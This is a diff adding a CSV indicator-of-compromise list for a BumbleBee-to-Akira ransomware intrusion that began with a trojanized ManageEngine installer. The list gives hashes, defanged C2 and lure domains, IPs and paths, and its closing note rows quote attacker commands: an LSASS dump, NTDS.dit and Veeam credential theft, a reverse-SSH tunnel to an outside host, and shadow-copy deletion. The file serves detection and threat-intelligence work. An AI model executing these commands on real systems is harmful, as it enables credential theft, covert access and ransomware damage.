@@ -1,0 +1,56 @@
+type,value,context,confidence,source
+sha256,186b26df63df3b7334043b47659cba4185c948629d857d47452cc1936f0aa5da,ManageEngine-OpManager.msi trojanized installer,high,The DFIR Report 2026-06-29
+sha1,ab82bf27132323861810c0efcac6d5dd01600dd4,ManageEngine-OpManager.msi trojanized installer,high,The DFIR Report 2026-06-29
+md5,124a48b78060fa851e1cc077ca35713c,ManageEngine-OpManager.msi trojanized installer,high,The DFIR Report 2026-06-29
+sha256,a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331,msimg32.dll BumbleBee loader sideloaded by consent.exe,high,The DFIR Report 2026-06-29
+sha1,febbaf5f08a8e0782ffcce8beef1f2b4e249a52b,msimg32.dll BumbleBee loader,high,The DFIR Report 2026-06-29
+md5,ca8646dfc88423bb9fffda811160cebe,msimg32.dll BumbleBee loader,high,The DFIR Report 2026-06-29
+sha256,de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d,locker.exe Akira ransomware,high,The DFIR Report 2026-06-29
+sha1,d66944e1a57daf04d3e809f22cd01946d593acaf,locker.exe Akira ransomware,high,The DFIR Report 2026-06-29
+md5,8c113b3aa82c81eee7c6b4ed0ba9a90f,locker.exe Akira ransomware,high,The DFIR Report 2026-06-29
+domain,opmanager[.]pro,Tier-1 SEO impersonation front for ManageEngine OpManager,high,The DFIR Report 2026-06-29
+domain,download-center[.]online,Tier-2 delivery gateway serving the trojanized MSI,high,The DFIR Report 2026-06-29
+domain,zenmap[.]pro,Tier-1 SEO impersonation front (related lure),medium,The DFIR Report 2026-06-29
+domain,ip-scanner[.]org,Advanced IP Scanner lure front (Swisscom sibling intrusion),medium,The DFIR Report 2026-06-29
+domain,ev2sirbd269o5j[.]org,BumbleBee DGA C2 domain,high,The DFIR Report 2026-06-29
+domain,2rxyt8yrhq0bgj[.]org,BumbleBee DGA C2 domain (atomic-list spelling),high,The DFIR Report 2026-06-29
+domain,d1hmxkpwby0d4s[.]org,BumbleBee DGA C2 domain,high,The DFIR Report 2026-06-29
+domain,yj6jurm5qqkye5[.]org,BumbleBee DGA C2 domain,high,The DFIR Report 2026-06-29
+domain,ewujsfb1dp5ran[.]org,BumbleBee DGA C2 domain,high,The DFIR Report 2026-06-29
+domain,8doj8uvx604eck[.]org,BumbleBee DGA C2 domain,high,The DFIR Report 2026-06-29
+domain,kwywztxoo2xdot[.]org,BumbleBee DGA C2 domain,high,The DFIR Report 2026-06-29
+domain,ky1d1p1daahe5t[.]org,BumbleBee DGA C2 domain,high,The DFIR Report 2026-06-29
+domain,ovh1kn1tcqw5kp[.]org,BumbleBee DGA C2 domain,high,The DFIR Report 2026-06-29
+domain,6cimu4mc085em8[.]org,BumbleBee DGA C2 domain,high,The DFIR Report 2026-06-29
+domain,5ka8rxp6t6eup2[.]org,BumbleBee DGA C2 domain,high,The DFIR Report 2026-06-29
+domain,ks501oz9nm3v05[.]org,BumbleBee DGA C2 domain,high,The DFIR Report 2026-06-29
+domain,v5rjsdqogstopr[.]org,BumbleBee DGA C2 domain,high,The DFIR Report 2026-06-29
+ipv4,192.121.22.94,BumbleBee C2,high,The DFIR Report 2026-06-29
+ipv4,109.205.195.211,BumbleBee C2 over HTTPS 443,high,The DFIR Report 2026-06-29
+ipv4,188.40.187.145,BumbleBee C2 over HTTPS 443,high,The DFIR Report 2026-06-29
+ipv4,171.22.183.43,BumbleBee C2,high,The DFIR Report 2026-06-29
+ipv4,194.127.178.21,BumbleBee C2,high,The DFIR Report 2026-06-29
+ipv4,172.96.137.160,AdaptixC2 beacon endpoint (Shock Hosting),high,The DFIR Report 2026-06-29
+ipv4,170.130.55.223,AdaptixC2 beacon endpoint (Swisscom sibling intrusion),medium,The DFIR Report 2026-06-29
+ipv4,193.242.184.150,Reverse-SSH tunnel endpoint (remote 10400 to local RDP),high,The DFIR Report 2026-06-29
+ipv4,185.174.100.203,FileZilla SFTP exfiltration server geolocated to Ukraine AS-COLOCROSSING,high,The DFIR Report 2026-06-29
+path,%TEMP%\ApplicationInstallationFolder_11,MSI drop folder for consent.exe + msimg32.dll + decoy,high,The DFIR Report 2026-06-29
+path,AdgNsy.exe,Renamed wab.exe injected with AdaptixC2 shellcode in %AppData%\Local,medium,The DFIR Report 2026-06-29
+path,C:\ProgramData\locker.exe,Akira ransomware staging path,high,The DFIR Report 2026-06-29
+path,n.exe,SoftPerfect Network Scanner renamed for recon,medium,The DFIR Report 2026-06-29
+path,C:\ProgramData\FileZilla_3.68.1_win64_sponsored2-setup.exe,FileZilla installer used for SFTP exfiltration,medium,The DFIR Report 2026-06-29
+string,backup_EA,Attacker-created domain account added to Enterprise Admins,high,The DFIR Report 2026-06-29
+string,backup_DA,Attacker-created domain account,high,The DFIR Report 2026-06-29
+string,delete.me,SoftPerfect Network Scanner write-test artifact,medium,The DFIR Report 2026-06-29
+note,consent.exe sideloads msimg32.dll from a non-System32 path,BumbleBee DLL search-order hijack T1574.001,high,The DFIR Report 2026-06-29
+note,OriginalFileName WAB.EXE running under WmiPrvSE.exe from %AppData%\Local,AdaptixC2 masquerade plus WMI spawn T1055 T1036,high,The DFIR Report 2026-06-29
+note,BumbleBee geofence via GetSystemDefaultLocaleName against 27 CIS locales,Anti-analysis execution guardrail T1480,high,The DFIR Report 2026-06-29
+note,wbadmin start backup -include ntds.dit plus SYSTEM plus SECURITY hives,NTDS.dit theft via native wbadmin T1003.003,high,The DFIR Report 2026-06-29
+note,psql -U postgres -d VeeamBackup -c SELECT user_name/password/description FROM credentials,Veeam credential store dump then DPAPI decrypt T1555,high,The DFIR Report 2026-06-29
+note,rundll32 comsvcs.dll #+000024 <PID> dump full,LSASS MiniDump lsassy smb/wmi/task/mmc pattern T1003.001,high,The DFIR Report 2026-06-29
+note,ssh <redacted>@193.242.184.150 -R *:10400 -p22,Reverse-SSH tunnel remote 10400 to local RDP T1090,high,The DFIR Report 2026-06-29
+note,Get-WmiObject Win32_Shadowcopy | Remove-WmiObject,Akira shadow-copy deletion via WMI PowerShell T1490,high,The DFIR Report 2026-06-29
+note,locker.exe -p=<path> -n=<pct>,Akira encryption CLI flags path and percent T1486,high,The DFIR Report 2026-06-29
+note,BumbleBee DGA narrative variant 2rxyt9urhq0bgj[.]org differs from atomic-list 2rxyt8yrhq0bgj[.]org,Source spelling discrepancy preserved not corrected,medium,The DFIR Report 2026-06-29
+note,Delivery gateways on AS47583 Hostinger; exfil server on AS-COLOCROSSING,Hosting infrastructure context,medium,The DFIR Report 2026-06-29
+note,Campaign genealogy Cyjax May 2025; DFIR/Swisscom flash alert 2025-08-05; Zscaler Ivanti-stealer sibling Oct 2025,CTI campaign genealogy,high,The DFIR Report 2026-06-29
